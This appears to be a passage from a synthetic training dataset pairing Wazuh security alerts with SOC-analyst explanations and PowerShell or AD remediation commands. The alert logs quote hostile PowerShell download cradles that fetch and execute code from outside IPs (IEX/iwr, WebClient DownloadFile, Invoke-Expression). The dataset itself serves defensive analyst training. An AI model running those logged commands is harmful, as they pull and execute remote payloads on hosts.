\"Block_Malicious_198.51.100.44\" -Direction Outbound -RemoteAddress 198.51.100.44 -Action Block"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:42:07Z\",\"rule\":{\"id\":\"60411\",\"level\":14,\"description\":\"Suspicious PowerShell downloading content from external IP\",\"groups\":\"windows,powershell,command_and_control\"},\"agent\":{\"id\":\"138\",\"name\":\"ws-ops-06\",\"ip\":\"192.168.61.28\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4104\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"ws-ops-06.corp.local\"},\"eventdata\":{\"ScriptBlockText\":\"IEX(iwr http://45.77.91.14/ps) \",\"UserId\":\"CORP\\\\ops3\"}}},\"location\":\"Microsoft-Windows-PowerShell/Operational\",\"full_log\":\"PowerShell script block logged: IEX(iwr http://45.77.91.14/ps)\"}","output":"PowerShell on ws-ops-06 executed a remote web request from 45.77.91.14, which is typical of malware stagers. Block the remote IP and perform host isolation if any payload executed. Remediation command: New-NetFirewallRule -DisplayName \"Block_Malicious_45.77.91.14\" -Direction Outbound -RemoteAddress 45.77.91.14 -Action Block"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:44:41Z\",\"rule\":{\"id\":\"60411\",\"level\":14,\"description\":\"Suspicious PowerShell downloading content from external IP\",\"groups\":\"windows,powershell,command_and_control\"},\"agent\":{\"id\":\"139\",\"name\":\"ws-admin-01\",\"ip\":\"192.168.61.29\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4104\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"ws-admin-01.corp.local\"},\"eventdata\":{\"ScriptBlockText\":\"$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://167.99.22.71/tool.exe','C:\\\\Temp\\\\tool.exe')\",\"UserId\":\"CORP\\\\admin1\"}}},\"location\":\"Microsoft-Windows-PowerShell/Operational\",\"full_log\":\"PowerShell script block logged: WebClient DownloadFile from http://167.99.22.71/tool.exe\"}","output":"PowerShell on ws-admin-01 downloaded a tool from 167.99.22.71, which is suspicious external retrieval behavior. Block the destination IP and inspect the downloaded binary before any further execution. Remediation command: New-NetFirewallRule -DisplayName \"Block_Malicious_167.99.22.71\" -Direction Outbound -RemoteAddress 167.99.22.71 -Action Block"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:47:15Z\",\"rule\":{\"id\":\"60411\",\"level\":14,\"description\":\"Suspicious PowerShell downloading content from external IP\",\"groups\":\"windows,powershell,command_and_control\"},\"agent\":{\"id\":\"140\",\"name\":\"ws-design-02\",\"ip\":\"192.168.61.30\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4104\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"ws-design-02.corp.local\"},\"eventdata\":{\"ScriptBlockText\":\"Invoke-Expression (Invoke-RestMethod http://64.227.55.93/raw)\",\"UserId\":\"CORP\\\\designer1\"}}},\"location\":\"Microsoft-Windows-PowerShell/Operational\",\"full_log\":\"PowerShell script block logged: Invoke-Expression (Invoke-RestMethod http://64.227.55.93/raw)\"}","output":"PowerShell on ws-design-02 fetched and executed remote content from 64.227.55.93, which is a strong malicious indicator. Block the IP immediately and check for spawned child processes or persistence. Remediation command: New-NetFirewallRule -DisplayName \"Block_Malicious_64.227.55.93\" -Direction Outbound -RemoteAddress 64.227.55.93 -Action Block"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:50:57Z\",\"rule\":{\"id\":\"60442\",\"level\":15,\"description\":\"NTDS.dit access from non-backup process detected\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"141\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4663\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"ObjectName\":\"C:\\\\Windows\\\\NTDS\\\\ntds.dit\",\"ProcessName\":\"C:\\\\Users\\\\Public\\\\7z.exe\",\"AccessMask\":\"0x2\",\"SubjectUserName\":\"svc-admin\"}}},\"location\":\"Security\",\"full_log\":\"An attempt was made to access an object. Object Name: C:\\\\Windows\\\\NTDS\\\\ntds.dit Process Name: C:\\\\Users\\\\Public\\\\7z.exe\"}","output":"A non-backup process accessed NTDS.dit on dc01, which may indicate attempted domain database theft. Terminate the process immediately and investigate how it reached the controller. Remediation command: Stop-Process -Name \"7z\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:53:24Z\",\"rule\":{\"id\":\"60442\",\"level\":15,\"description\":\"NTDS.dit access from non-backup process detected\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"142\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4663\",\"channel\":\"Security\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"ObjectName\":\"C:\\\\Windows\\\\NTDS\\\\ntds.dit\",\"ProcessName\":\"C:\\\\Temp\\\\esentutl.exe\",\"AccessMask\":\"0x2\",\"SubjectUserName\":\"tempadmin\"}}},\"location\":\"Security\",\"full_log\":\"An attempt was made to access an object. Object Name: C:\\\\Windows\\\\NTDS\\\\ntds.dit Process Name: C:\\\\Temp\\\\esentutl.exe\"}","output":"esentutl.exe accessed NTDS.dit on dc02 from an unusual path, which is suspicious for offline AD database extraction. Terminate the process immediately and review the initiating account tempadmin. Remediation command: Stop-Process -Name \"esentutl\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:55:58Z\",\"rule\":{\"id\":\"60442\",\"level\":15,\"description\":\"NTDS.dit access from non-backup process detected\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"143\",\"name\":\"dc03\",\"ip\":\"192.168.60.12\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4663\",\"channel\":\"Security\",\"computer\":\"dc03.corp.local\"},\"eventdata\":{\"ObjectName\":\"C:\\\\Windows\\\\NTDS\\\\ntds.dit\",\"ProcessName\":\"C:\\\\Users\\\\Public\\\\ntdsutil.exe\",\"AccessMask\":\"0x2\",\"SubjectUserName\":\"reportsvc\"}}},\"location\":\"Security\",\"full_log\":\"An attempt was made to access an object. Object Name: C:\\\\Windows\\\\NTDS\\\\ntds.dit Process Name: C:\\\\Users\\\\Public\\\\ntdsutil.exe\"}","output":"ntdsutil.exe was used from a public path to access NTDS.dit on dc03, which is strongly suspicious. Stop the process now and begin credential compromise response for the domain. Remediation command: Stop-Process -Name \"ntdsutil\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:58:33Z\",\"rule\":{\"id\":\"60442\",\"level\":15,\"description\":\"NTDS.dit access from non-backup process detected\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"144\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4663\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"ObjectName\":\"C:\\\\Windows\\\\NTDS\\\\ntds.dit\",\"ProcessName\":\"C:\\\\ProgramData\\\\vssadmin.exe\",\"AccessMask\":\"0x2\",\"SubjectUserName\":\"buildsvc\"}}},\"location\":\"Security\",\"full_log\":\"An attempt was made to access an object. Object Name: C:\\\\Windows\\\\NTDS\\\\ntds.dit Process Name: C:\\\\ProgramData\\\\vssadmin.exe\"}","output":"vssadmin.exe from ProgramData accessed NTDS.dit on dc01, suggesting shadow-copy abuse for credential theft. Stop the process immediately and examine recent volume shadow copies. Remediation command: Stop-Process -Name \"vssadmin\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:01:07Z\",\"rule\":{\"id\":\"60442\",\"level\":15,\"description\":\"NTDS.dit access from non-backup process detected\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"145\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4663\",\"channel\":\"Security\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"ObjectName\":\"C:\\\\Windows\\\\NTDS\\\\ntds.dit\",\"ProcessName\":\"C:\\\\Users\\\\Public\\\\robocopy.exe\",\"AccessMask\":\"0x2\",\"SubjectUserName\":\"svc-monitor\"}}},\"location\":\"Security\",\"full_log\":\"An attempt was made to access an object. Object Name: C:\\\\Windows\\\\NTDS\\\\ntds.dit Process Name: C:\\\\Users\\\\Public\\\\robocopy.exe\"}","output":"robocopy.exe accessed NTDS.dit on dc02 from an unusual location, which can indicate domain database staging or exfiltration. Stop the process immediately and review any copied files or outbound transfers. Remediation command: Stop-Process -Name \"robocopy\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:04:49Z\",\"rule\":{\"id\":\"60466\",\"level\":14,\"description\":\"GPO modified outside approved change window\",\"groups\":\"windows,active_directory,persistence\"},\"agent\":{\"id\":\"146\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"5136\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"ObjectDN\":\"CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=local\",\"AttributeLDAPDisplayName\":\"gPCFileSysPath\",\"SubjectUserName\":\"jdoe-admin\"}}},\"location\":\"Security\",\"full_log\":\"A directory service object was modified. Object: Default Domain Controllers Policy Attribute: gPCFileSysPath Subject: jdoe-admin\"}","output":"A GPO affecting domain controllers was modified by jdoe-admin outside an expected window, which may be persistence or policy abuse. Disable the modifying account immediately while the change is reviewed. Remediation command: Disable-ADAccount -Identity \"jdoe-admin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:07:15Z\",\"rule\":{\"id\":\"60466\",\"level\":14,\"description\":\"GPO modified outside approved change window\",\"groups\":\"windows,active_directory,persistence\"},\"agent\":{\"id\":\"147\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"5136\",\"channel\":\"Security\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"ObjectDN\":\"CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local\",\"AttributeLDAPDisplayName\":\"versionNumber\",\"SubjectUserName\":\"it-support\"}}},\"location\":\"Security\",\"full_log\":\"A directory service object was modified. Object: Default Domain Policy Attribute: versionNumber Subject: it-support\"}","output":"The Default Domain Policy was modified by it-support outside the normal change process, which could be malicious GPO persistence. Disable the account until the legitimacy of the change is confirmed. Remediation command: Disable-ADAccount -Identity \"it-support\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:09:48Z\",\"rule\":{\"id\":\"60466\",\"level\":14,\"description\":\"GPO modified outside approved change window\",\"groups\":\"windows,active_directory,persistence\"},\"agent\":{\"id\":\"148\",\"name\":\"dc03\",\"ip\":\"192.168.60.12\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"5136\",\"channel\":\"Security\",\"computer\":\"dc03.corp.local\"},\"eventdata\":{\"ObjectDN\":\"CN={A1B2C3D4-1000-2000-3000-ABCDEF000001},CN=Policies,CN=System,DC=corp,DC=local\",\"AttributeLDAPDisplayName\":\"gPCMachineExtensionNames\",\"SubjectUserName\":\"tempadmin\"}}},\"location\":\"Security\",\"full_log\":\"A directory service object was modified. Object: Workstation Baseline Policy Attribute: gPCMachineExtensionNames Subject: tempadmin\"}","output":"A workstation baseline GPO was modified by tempadmin and may have been weaponized for persistence or mass execution. Disable the modifying account immediately and review the GPO delta. Remediation command: Disable-ADAccount -Identity \"tempadmin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:12:20Z\",\"rule\":{\"id\":\"60466\",\"level\":14,\"description\":\"GPO modified outside approved change window\",\"groups\":\"windows,active_directory,persistence\"},\"agent\":{\"id\":\"149\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"5136\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"ObjectDN\":\"CN={A1B2C3D4-1000-2000-3000-ABCDEF000002},CN=Policies,CN=System,DC=corp,DC=local\",\"AttributeLDAPDisplayName\":\"gPCUserExtensionNames\",\"SubjectUserName\":\"unknown-admin\"}}},\"location\":\"Security\",\"full_log\":\"A directory service object was modified. Object: User Lockdown Policy Attribute: gPCUserExtensionNames Subject: unknown-admin\"}","output":"A user-focused GPO was modified by unknown-admin, which may have introduced malicious scripts or registry changes. Disable the account immediately and validate the last known good policy version. Remediation command: Disable-ADAccount -Identity \"unknown-admin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:14:57Z\",\"rule\":{\"id\":\"60466\",\"level\":14,\"description\":\"GPO modified outside approved change window\",\"groups\":\"windows,active_directory,persistence\"},\"agent\":{\"id\":\"150\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"5136\",\"channel\":\"Security\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"ObjectDN\":\"CN={A1B2C3D4-1000-2000-3000-ABCDEF000003},CN=Policies,CN=System,DC=corp,DC=local\",\"AttributeLDAPDisplayName\":\"displayName\",\"SubjectUserName\":\"reportsvc\"}}},\"location\":\"Security\",\"full_log\":\"A directory service object was modified. Object: Remote Management Policy Attribute: displayName Subject: reportsvc\"}","output":"reportsvc modified a GPO object on dc02 outside a standard change process, which is abnormal for a service account. Disable the account immediately and review what policy settings changed beyond the display name. Remediation command: Disable-ADAccount -Identity \"reportsvc\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:18:39Z\",\"rule\":{\"id\":\"60501\",\"level\":13,\"description\":\"Windows Defender detected credential theft tool\",\"groups\":\"windows,malware,defender,credential_access\"},\"agent\":{\"id\":\"151\",\"name\":\"ws-admin-02\",\"ip\":\"192.168.61.31\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"1116\",\"channel\":\"Microsoft-Windows-Windows Defender/Operational\",\"computer\":\"ws-admin-02.corp.local\"},\"eventdata\":{\"ThreatName\":\"HackTool:Win64/Mimikatz\",\"SeverityName\":\"High\",\"Path\":\"C:\\\\Users\\\\Admin\\\\Downloads\\\\mimikatz.exe\",\"ActionName\":\"Quarantine\"}}},\"location\":\"Microsoft-Windows-Windows Defender/Operational\",\"full_log\":\"Windows Defender Antivirus has detected HackTool:Win64/Mimikatz in C:\\\\Users\\\\Admin\\\\Downloads\\\\mimikatz.exe\"}","output":"Microsoft Defender detected Mimikatz on ws-admin-02, which is a direct credential theft tool. Run a full Defender scan now and verify whether LSASS or AD credentials were already accessed. Remediation command: Start-MpScan -ScanType FullScan; Remove-MpThreat"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T15:21:06Z\",\"rule\":{\"id\":\"60501\",\"level\":13,\"description\":\"Windows Defender detected credential theft tool\",\"groups\":\"windows,malware,defender,credential_access\"},\"agent\":{\"id\":\"152\",\"name\":\"ws-it-12\",\"ip\":\"192.168.61.32\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"1116\",\"channel\":\"Microsoft-Windows-Windows Defender/Operational\",\"computer\":\"ws-it-12.corp.local\"},\"eventdata\":{\"ThreatName\":\"HackTool:MSIL/Rubeus\",\"SeverityName\":\"High\",\"Path\":\"C:\\\\Temp\\\\rubeus.exe\",\"ActionName\":\"Quarantine\"}}},\"location\":\"Microsoft-Windows-Windows Defender/Operational\",\"full_log\":\"Windows Defender Antivirus has detected HackTool:MSIL/Rubeus in C:\\\\Temp\\\\rubeus.exe\"}","output":"Defender detected Rubeus on ws-it-12, which is commonly used for Kerberos abuse and privilege escalation. Run a full scan and review whether ticket extraction or abuse occurred before quarantine. Remediation command: Start-MpScan -ScanType FullScan; Remove-MpThreat"}
